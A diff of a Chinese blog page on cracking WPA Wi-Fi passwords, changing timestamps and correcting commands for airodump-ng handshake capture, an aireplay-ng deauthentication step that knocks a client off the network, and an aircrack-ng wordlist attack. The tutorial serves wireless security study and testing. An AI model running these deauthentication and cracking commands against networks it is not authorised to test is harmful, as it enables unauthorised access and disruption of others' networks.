@@ -33,7 +33,7 @@
 <meta property="og:image" content="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/7DC28669142B44EEBFB4F75AD6887744/918">
 <meta property="og:image" content="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/1AF5BBD248E54CB8AB60B5D4F144D421/926">
 <meta property="og:image" content="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/3391248596AF4F8A923ADDE0CE28F2E4/936">
-<meta property="og:updated_time" content="2018-03-03T05:34:56.814Z">
+<meta property="og:updated_time" content="2018-03-03T05:52:01.031Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="无线渗透(上)--WPA加密">
 <meta name="twitter:description" content="0x00. 无线渗透简介&amp;emsp;&amp;emsp;在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高">
@@ -332,11 +332,11 @@
 </blockquote>
 <p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303131705_B6RuT1_Screenshot.jpeg" alt=""></p>
 <h4 id="emsp-4-启动airodump-ng进行抓包侦听"><a href="#emsp-4-启动airodump-ng进行抓包侦听" class="headerlink" title="&emsp;4.启动airodump-ng进行抓包侦听"></a>&emsp;4.启动airodump-ng进行抓包侦听</h4><blockquote>
-<p>airodump-ng wlan0mon -c 11 –essid TimeS0ng -w wifi_TimeS0ng</p>
+<p>airodump-ng wlan0mon -c 11 <strong>-</strong>-essid TimeS0ng -w wifi_TimeS0ng</p>
 </blockquote>
 <p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/7DC28669142B44EEBFB4F75AD6887744/918" alt="image"></p>
 <h4 id="emsp-5-利用aireplay-ng-aireplay-0-3-a-AP-MAC-c-STA-MAC-interface-emsp-迫使MAC为-98-01-A7-C5-F7-6D的主机下线重连Wi-Fi，以便抓取四步握手"><a href="#emsp-5-利用aireplay-ng-aireplay-0-3-a-AP-MAC-c-STA-MAC-interface-emsp-迫使MAC为-98-01-A7-C5-F7-6D的主机下线重连Wi-Fi，以便抓取四步握手" class="headerlink" title="&emsp;5.利用aireplay-ng(aireplay -0 3 -a [AP MAC] -c [STA MAC] [interface] &emsp;迫使MAC为 98:01:A7:C5:F7:6D的主机下线重连Wi-Fi，以便抓取四步握手"></a>&emsp;5.利用aireplay-ng(aireplay -0 3 -a [AP MAC] -c [STA MAC] [interface] &emsp;迫使MAC为 98:01:A7:C5:F7:6D的主机下线重连Wi-Fi，以便抓取四步握手</h4><blockquote>
-<p>aireplay -0 3 -a 98:01:A7:C5:F7:6D -c E4:F3:F5:2D:55:A9 wlan0mon</p>
+<p>aireplay -0 3 -c 98:01:A7:C5:F7:6D -a E4:F3:F5:2D:55:A8 wlan0mon</p>
 </blockquote>
 <p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/1AF5BBD248E54CB8AB60B5D4F144D421/926" alt="image"></p>
 <h4 id="emsp-6-调用aircrack-ng破解密码-aircrack-ng-w-wordlist-txt-wpa-01-cap"><a href="#emsp-6-调用aircrack-ng破解密码-aircrack-ng-w-wordlist-txt-wpa-01-cap" class="headerlink" title="&emsp;6.调用aircrack-ng破解密码(aircrack-ng -w [wordlist.txt] wpa-01.cap)"></a>&emsp;6.调用aircrack-ng破解密码(aircrack-ng -w [wordlist.txt] wpa-01.cap)</h4><blockquote>
@@ -356,7 +356,7 @@
         <p><span>本文标题:</span><a href="/2017/08/30/无线渗透(上)--WPA加密/">无线渗透(上)--WPA加密</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
         <p><span>发布时间:</span>2017-08-30, 23:32:55</p>
-        <p><span>最后更新:</span>2018-03-03, 13:34:56</p>
+        <p><span>最后更新:</span>2018-03-03, 13:52:01</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2017/08/30/无线渗透(上)--WPA加密/" title="无线渗透(上)--WPA加密">http://TimeS0ng.github.io/2017/08/30/无线渗透(上)--WPA加密/</a>
             <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2017/08/30/无线渗透(上)--WPA加密/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
